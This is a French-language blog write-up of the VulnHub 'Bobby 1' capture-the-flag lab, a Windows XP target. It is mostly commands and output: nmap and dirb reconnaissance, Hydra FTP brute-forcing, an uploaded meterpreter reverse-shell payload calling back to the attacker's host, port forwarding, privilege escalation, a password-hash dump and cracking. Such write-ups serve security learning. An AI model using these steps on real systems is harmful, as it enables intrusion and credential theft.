# Solution du CTF Bobby 1

Mise en place de la VM
----------------------

Pour cette fois je me suis attaqué à un CTF sur *Windows*. Comment est-ce légalement possible ?  

Et bien tout simplement le challenge ne propose pas une machine virtuelle pour [ce CTF](http://vulnhub.com/entry/bobby_1,42/) mais un exécutable *Windows* (le *VulnInjector*) destiné à modifier un ISO de *Windows XP SP3*.  

Le côté légal est donc laissé au participant qui doit disposer d'un ISO de ce système EN ANGLAIS (car l'exécutable se base sur *AutoIt* et s'attend à trouver un compte baptisé *Administrator*).  

Vous devez disposer du framework *.NET* sur la machine pour que l'exécutable puisse fonctionner. L'opération de modification dure quelques minutes et vous aurez à saisir une product-key Windows valide.  

Ensuite il ne vous restera plus qu'à mettre en place la machine virtuelle à partir de l'ISO modifié. Pour la configuration réseau privilégiez le mode bridged (ponté).  

Le système est pré-configuré avec une adresse IP statique : 192.168.1.11.  

Découverte
----------

```plain
nmap -A -T4 192.168.1.11

Starting Nmap 6.40 ( http://nmap.org ) at 2014-03-25 19:00 CET
Nmap scan report for 192.168.1.11
Host is up (0.00028s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE VERSION
21/tcp  open   ftp     Microsoft ftpd
|_ftp-bounce: no banner
80/tcp  open   http    Microsoft IIS httpd 5.1
|_http-generator: MSHTML 8.00.6001.19154
| http-methods: Potentially risky methods: TRACE PUT DELETE
|_See http://nmap.org/nsedoc/scripts/http-methods.html
|_http-title: TheXero-01
443/tcp closed https
MAC Address: 08:00:27:EB:5E:30 (Cadmus Computer Systems)
Device type: general purpose
Running: Microsoft Windows XP
OS CPE: cpe:/o:microsoft:windows_xp::sp2 cpe:/o:microsoft:windows_xp::sp3
OS details: Microsoft Windows XP SP2 or SP3, Microsoft Windows XP SP3
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE
HOP RTT     ADDRESS
1   0.28 ms 192.168.1.11

OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.01 seconds
```

Les ports 21 et 80 sont ouverts. Le reste des ports (en dehors du 443) sont filtrés, il y a donc un firewall présent pour protéger les services *Windows* habituels (Netbios, SMb...)  

Est-ce qu'il y a des dossiers cachés sur le serveur web ? Utilisons [dirb](http://dirb.sourceforge.net/) (un équivalent de *DirBuster* mais en console) pour s'en rendre compte :

```plain
./dirb http://192.168.1.11/ wordlists/big.txt 

-----------------
DIRB v2.21    
By The Dark Raver
-----------------

START_TIME: Tue Mar 25 19:01:45 2014
URL_BASE: http://192.168.1.11/
WORDLIST_FILES: wordlists/big.txt

-----------------

GENERATED WORDS: 20458                                                         

---- Scanning URL: http://192.168.1.11/ ----
+ http://192.168.1.11/iisadmin (CODE:403|SIZE:4083)                                                                                                                                                           
+ http://192.168.1.11/printers (CODE:401|SIZE:4431)                                                                                                                                                           

-----------------
DOWNLOADED: 20458 - FOUND: 2
```

Rien d'intéressant au niveau de ces pages. Le dossier */printers/* requiert des identifiants qui ne semblent pas sensibles à une quelconque injection. De plus la page demande une authentification NTML donc probablement les identifiants *Windows*.  

La page d'index du site est le blog d'un certain *Bobby* mais *Bobby* est un peu trop bavard :  

![Blog de Bobby](https://github.com/devl00p/blog/raw/master/images/bobby_blog.png)  

On trouve d'autres informations en commentaire dans le code HTML :  

> Bobby sounds more 'me', not Robert/Bob

Il y a aussi le titre de la page qui est "TheXero-01"  

On créé une petite wordlist rapide en se basant sur ces informations :  

```plain
Bobby                                                                                                                                                                                                          
b0bby                                                                                                                                                                                                          
Matrix                                                                                                                                                                                                         
m4trix                                                                                                                                                                                                         
reloaded                                                                                                                                                                                                       
r3l04d3d                                                                                                                                                                                                       
Daft                                                                                                                                                                                                           
d4ft                                                                                                                                                                                                           
Punk                                                                                                                                                                                                           
Windows                                                                                                                                                                                                        
3.1                                                                                                                                                                                                            
Matrix reloaded                                                                                                                                                                                                
Daft Punk
Windows 3.1
Microsoft
Neo
n3o
n30
Morpheus
m0rph3us
Trinity
hacker
hacker
haxor
TheXero-01
xero
thexero
robert
bob
```

Puis on génère une seconde wordlist basée sur celle-ci en appliquant des mutations via John The Ripper :  

```bash
/opt/jtr/john --rules --wordlist=dico.txt --stdout > candidates.txt
```

On lance une attaque brute-force à l'aide de *THC-Hydra*. Après avoir testé différents logins (*bobby*, *admin*...) on trouve finalement le bon password pour l'utilisateur *bob* :

```plain
./hydra -l bob -P ../candidates.txt -t 1 ftp://192.168.1.11/ 
Hydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only

Hydra (http://www.thc.org/thc-hydra) starting at 2014-03-25 21:16:08
[DATA] 1 task, 1 server, 835 login tries (l:1/p:835), ~835 tries per task
[DATA] attacking service ftp on port 21
[21][ftp] host: 192.168.1.11   login: bob   password: Matrix
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2014-03-25 21:16:08
```

Attention le serveur FTP gère très mal la surcharge et avec le nombre de threads par défaut de *Hydra* il retournait souvent une erreur 421.  

```plain
> ftp 192.168.1.11
Connected to 192.168.1.11.
220 Microsoft FTP Service
Name (192.168.1.11): bob
331 Password required for bob.
Password: 
230 User bob logged in.
Remote system type is Windows_NT.
ftp> ls
227 Entering Passive Mode (192,168,1,11,4,3).
^C
receive aborted. Waiting for remote to finish abort.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls -alR
200 PORT command successful.
150 Opening ASCII mode data connection for /bin/ls.
03-25-14  06:56PM       <:DIR>          AdminScripts
03-25-14  06:56PM       <:DIR>          ftproot
03-25-14  06:56PM       <:DIR>          iissamples
03-25-14  06:56PM       <:DIR>          Scripts
03-25-14  06:56PM       <:DIR>          wwwroot

.\AdminScripts:
04-02-07  09:40AM                85813 adsutil.vbs
07-21-01  02:21PM                 4490 chaccess.vbs
07-21-01  02:21PM                 2599 contftp.vbs
07-21-01  02:21PM                 2623 contsrv.vbs
07-21-01  02:21PM                 2596 contweb.vbs
07-21-01  02:21PM                 5017 dispnode.vbs
07-21-01  02:21PM                 2550 disptree.vbs
07-21-01  02:21PM                 6258 findweb.vbs
07-21-01  02:21PM                 7186 mkwebdir.vbs
07-21-01  02:21PM                 2591 pauseftp.vbs
07-21-01  02:21PM                 2615 pausesrv.vbs
07-21-01  02:21PM                 2588 pauseweb.vbs
07-21-01  02:21PM                 2593 startftp.vbs
07-21-01  02:21PM                 2617 startsrv.vbs
07-21-01  02:21PM                 2590 startweb.vbs
07-21-01  02:21PM                 2584 stopftp.vbs
07-21-01  02:21PM                 2608 stopsrv.vbs
07-21-01  02:21PM                 2581 stopweb.vbs
07-21-01  02:21PM                 6064 synciwam.vbs

.\wwwroot:
12-08-11  01:56PM               272367 backgroup.jpg
12-10-11  02:55PM                  101 hint.html
02-12-13  12:46PM                 1228 index.html
226 Transfer complete.
```

Le dossier *AdminScripts* semble contenir des fichiers par défaut pour une install IIS. Le *wwwroot* est bien sûr la racine web du site.  

Dans le fichier *hint.html* on trouve le texte suivant :

```plain
#1 This very common Windows file is not downloaded or interpretered but rather executed server side
```

Soit ! On génère une backdoor *Metasploit* (un reverse-shell meterpreter) que l'on uploade sur le FTP (attention à être en mode binaire) :  

```plain
msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.3 LPORT=9999 X > /tmp/rbd.exe
```

On met en place un handler d'écoute et on ouvre la page via le navigateur pour provoquer l'exécution :  

```plain
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.1.3
LHOST => 192.168.1.3
msf exploit(handler) > set LPORT 9999
LPORT => 9999
msf exploit(handler) > exploit

[*] Started reverse handler on 192.168.1.3:9999 
[*] Starting the payload handler...
[*] Sending stage (770048 bytes) to 192.168.1.11
[*] Meterpreter session 1 opened (192.168.1.3:9999 -> 192.168.1.11:1061) at 2014-03-26 08:25:14 +0100
meterpreter > ps

Process List
============

 PID   PPID  Name              Arch  Session     User              Path
 ---   ----  ----              ----  -------     ----              ----
 0     0     [System Process]        4294967295                    
 4     0     System                  4294967295                    
 348   4     smss.exe                4294967295                    
 396   348   csrss.exe               4294967295                    
 420   348   winlogon.exe            4294967295                    
 472   420   services.exe            4294967295                    
 484   420   lsass.exe               4294967295                    
 636   472   svchost.exe             4294967295                    
 696   472   svchost.exe             4294967295                    
 772   472   svchost.exe             4294967295                    
 820   472   svchost.exe             4294967295                    
 856   472   svchost.exe             4294967295                    
 984   472   spoolsv.exe             4294967295                    
 1040  420   logonui.exe             4294967295                    
 1396  1580  rbd.exe           x86   0           BOBBY\IUSR_BOBBY  \\?\c:\inetpub\wwwroot\rbd.exe
 1428  420   logon.scr               4294967295                    
 1580  472   inetinfo.exe            4294967295                    
 2012  472   alg.exe                 4294967295
meterpreter > getuid
Server username: BOBBY\IUSR_BOBBY
```

Malheureusement le process est arrêté au bout d'un moment car le serveur web ou le navigateur génère un timeout (notre exécutable est traité comme un CGI).  

Il faut que l'on relance un process séparément, ce qui peut se faire directement depuis la session *meterpreter* si on est assez rapide :  

```plain
meterpreter > execute -f rbd.exe
Process 756 created.
meterpreter > background
[*] Backgrounding session 2...
msf exploit(handler) > exploit

[*] Started reverse handler on 192.168.1.3:9999 
[*] Starting the payload handler...
[*] Sending stage (770048 bytes) to 192.168.1.11
[*] Meterpreter session 2 opened (192.168.1.3:9999 -> 192.168.1.11:1048) at 2014-03-25 22:17:02 +0100

meterpreter >
```

Bien maintenant la connexion tient bon mais on ne peut pas faire grand chose avec nos droits en cours :

```plain
meterpreter > getprivs
============================================================
Enabled Process Privileges
============================================================
  SeShutdownPrivilege
  SeChangeNotifyPrivilege
  SeUndockPrivilege

meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: Access is denied.
meterpreter > shell
[-] stdapi_sys_process_execute: Operation failed: Access is denied.
```

C'est du au faut que les droits dont on dispose sont ceux d'un *IUSR* (Internet User) qui doit être la correspondance *IIS* du *nobody* pour *Apache/Unix*.  

Voyons voir ce qu'il y a d'autre comme services sur cette machine :  

```plain
meterpreter > netstat

Connection list
===============

    Proto  Local address      Remote address    State        User  Inode  PID/Program name
    -----  -------------      --------------    -----        ----  -----  ----------------
    tcp    0.0.0.0:21         0.0.0.0:*         LISTEN       0     0      1580/inetinfo.exe
    tcp    0.0.0.0:80         0.0.0.0:*         LISTEN       0     0      1580/inetinfo.exe
    tcp    0.0.0.0:135        0.0.0.0:*         LISTEN       0     0      696/svchost.exe
    tcp    0.0.0.0:445        0.0.0.0:*         LISTEN       0     0      4/System
    tcp    0.0.0.0:1025       0.0.0.0:*         LISTEN       0     0      1580/inetinfo.exe
    tcp    0.0.0.0:3389       0.0.0.0:*         LISTEN       0     0      636/svchost.exe
    tcp    127.0.0.1:1026     0.0.0.0:*         LISTEN       0     0      2012/alg.exe
    tcp    192.168.1.11:139   0.0.0.0:*         LISTEN       0     0      4/System
    tcp    192.168.1.11:1062  192.168.1.3:9999  ESTABLISHED  0     0      1224/rbd.exe
    tcp    127.0.0.1:1072     127.0.0.1:445     TIME_WAIT    0     0      0/[System Process]
    udp    0.0.0.0:500        0.0.0.0:*                      0     0      484/lsass.exe
    udp    0.0.0.0:4500       0.0.0.0:*                      0     0      484/lsass.exe
    udp    0.0.0.0:3456       0.0.0.0:*                      0     0      1580/inetinfo.exe
    udp    0.0.0.0:445        0.0.0.0:*                      0     0      4/System
    udp    127.0.0.1:123      0.0.0.0:*                      0     0      772/svchost.exe
    udp    192.168.1.11:137   0.0.0.0:*                      0     0      4/System
    udp    192.168.1.11:123   0.0.0.0:*                      0     0      772/svchost.exe
    udp    192.168.1.11:138   0.0.0.0:*                      0     0      4/System
```

Come get some
-------------

Essayons de mettre en place une route depuis *Metasploit* afin de pouvoir lancer un exploit SMB sur la port 445 local :  

```plain
msf exploit(handler) > route add 127.0.0.1 255.255.255.0 2
[*] Route added
msf exploit(handler) > connect 127.0.0.1 445
[*] Connected to 127.0.0.1:445
^Cmsf exploit(handler) >
```

La redirection fonctionne :)  

```plain
msf exploit(handler) > use exploit/windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) > set RHOST 127.0.0.1
RHOST => 127.0.0.1
msf exploit(ms08_067_netapi) > exploit

[*] Started reverse handler on 127.0.0.1:9999 via the meterpreter on session 2
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP - Service Pack 2+ - lang:English
[-] Could not determine the exact service pack
[*] Auto-targeting failed, use 'show targets' to manually select one
```

et si on fixe la target :  

```plain
[*] Started reverse handler on 127.0.0.1:9999 via the meterpreter on session 2
[-] Exploit failed: Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: STATUS_OBJECT_NAME_NOT_FOUND (Command=162 WordCount=0)
```

Bon, plusieurs possibilités : soit je fais quelque chose mal, soit l'ISO que j'ai est patché contre cette attaque, soit le *VulnInjector* a pris soin de patcher la faille d'une manière ou d'une autre...  

Kansas City Shuffle
-------------------

On va plutôt créer une redirection de port vers le service *TSE* (port 3389) et voir ce qu'on peut en faire :

```plain
meterpreter > portfwd add -l 3389 -p 3389 -r 127.0.0.1
[*] Local TCP relay created: 0.0.0.0:3389 <:-> 127.0.0.1:3389
```

On peut maintenant se connecter via *TSE* avec les même identifiants que pour le FTP (sous *openSUSE* il y a un client tout ce qu'il y a d'épuré).  

![Configuration du client RDP](https://github.com/devl00p/blog/raw/master/images/rdp.png)

Sous *Metasploit*, on relance le handler et depuis la session *Windows* on lance *rbd.exe*.  

```plain
msf exploit(handler) > exploit

[*] Started reverse handler on 192.168.1.3:9999 
[*] Starting the payload handler...
[*] Sending stage (770048 bytes) to 192.168.1.11
[*] Meterpreter session 3 opened (192.168.1.3:9999 -> 192.168.1.11:1094) at 2014-03-26 19:29:40 +0100

meterpreter > getuid
Server username: BOBBY\bob
meterpreter > getsystem
...got system (via technique 4).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > run post/windows/gather/hashdump

[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY f7c6aa7200e401d1b8667e066d1822e0...
[*] Obtaining the user list and keys...
[*] Handle is invalid, retrying...
[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY f7c6aa7200e401d1b8667e066d1822e0...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hints...

No users with password hints on this system

[*] Dumping password hashes...

Administrator:500:921988ba001dc8e1e1c7c53891cb0efa:e1270db1dd8bf1e32725729695aa1feb:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:0d5a495be0d12c5c0001826d12a103db:e63e0754cf4f25edc0918ca39e06cb46:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:460935cc09bcbec00cc9b37788db5a54:::
bob:1003:66e5d5ae82299cb6aad3b435b51404ee:42865c72994c34e54d4c5d659fc15b10:::
IUSR_BOBBY:1004:080d6ebbb9f70bc7b9fa1681c900a5b1:2c30939c170e28b5becd8c652425ea85:::
IWAM_BOBBY:1005:519481f2f1ae0a2fa91d88c577b32453:713317229556300b105c82332af604b1:::
```

Là on est entré comme dans du beurre :)  

A partir de là on a le choix entre la méthode old-school de cassage de hash (a.k.a [classic one way ticket to Fuckneckville](https://www.youtube.com/watch?v=H7nBDONk4FA)) :  

```plain
>/opt/jtr/john hash.txt                                                                                                                                                        
Warning: detected hash type "lm", but the string is also recognized as "nt2"                                                                                                                                   
Use the "--format=nt2" option to force loading these as that type instead                                                                                                                                      
Warning: detected hash type "lm", but the string is also recognized as "nt"                                                                                                                                    
Use the "--format=nt" option to force loading these as that type instead                                                                                                                                       
Loaded 2 password hashes with no different salts (LM DES [128/128 BS AVX-16])                                                                                                                                  
D12345           (Administrator:2)                                                                                                                                                                             
guesses: 1  time: 0:00:01:12 0.04% (3)  c/s: 47036K  trying: 3LUYN4N - 3LUYPTC                                                                                                                                 
P@SSW0R          (Administrator:1)                                                                                                                                                                             
guesses: 2  time: 0:01:25:27 DONE (Wed Mar 26 15:06:06 2014)  c/s: 46616K  trying: P@SSWEG - P@SSWAU                                                                                                           
Warning: passwords printed above might be partial                                                                                                                                                              
Use the "--show" option to display all of the cracked passwords reliably
```

Le mot de passe est p@ssword12345, on peut lancer un *cmd.exe* via *runas*.  

Ou alors on continue avec notre meterpreter...  

Si on obtient un shell et que l'on tente d'aller dans le dossier administrator, l'accès est refusé :(  

C'est sans doute parce que l'on est dans un processus qui n'appartient pas à *SYSTEM*, on va donc déménager :

```plain
meterpreter > ps

Process List
============

 PID   PPID  Name              Arch  Session     User                          Path
 ---   ----  ----              ----  -------     ----                          ----
 0     0     [System Process]        4294967295                                
 4     0     System            x86   0           NT AUTHORITY\SYSTEM           
 176   360   ctfmon.exe        x86   2           BOBBY\bob                     C:\WINDOWS\system32\ctfmon.exe
 348   4     smss.exe          x86   0           NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 360   1868  explorer.exe      x86   2           BOBBY\bob                     C:\WINDOWS\Explorer.EXE
 396   348   csrss.exe         x86   0           NT AUTHORITY\SYSTEM           \??\C:\WINDOWS\system32\csrss.exe
 420   348   winlogon.exe      x86   0           NT AUTHORITY\SYSTEM           \??\C:\WINDOWS\system32\winlogon.exe
 472   420   services.exe      x86   0           NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\services.exe
 484   420   lsass.exe         x86   0           NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\lsass.exe
 772   472   svchost.exe       x86   0           NT AUTHORITY\SYSTEM           C:\WINDOWS\System32\svchost.exe
 820   472   svchost.exe       x86   0           NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\svchost.exe
 1252  348   winlogon.exe      x86   2           NT AUTHORITY\SYSTEM           \??\C:\WINDOWS\system32\winlogon.exe

meterpreter > migrate 772
[*] Migrating from 768 to 772...
[*] Migration completed successfully.
meterpreter > shell
Process 1188 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>cd "c:\documents and settings\administrator\desktop\"
cd "c:\documents and settings\administrator\desktop\"

C:\Documents and Settings\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D031-5715

 Directory of C:\Documents and Settings\Administrator\Desktop

03/25/2014  06:56 PM    <:DIR>          .
03/25/2014  06:56 PM    <:DIR>          ..
02/04/2013  03:25 PM                32 secret.txt
               1 File(s)             32 bytes
               2 Dir(s)     249,012,224 bytes free

C:\Documents and Settings\Administrator\Desktop>type secret.txt
type secret.txt
ab74f8217d5619acb2b708c7bdc50748
```

Terminated

*Published March 28 2014 at 18 01*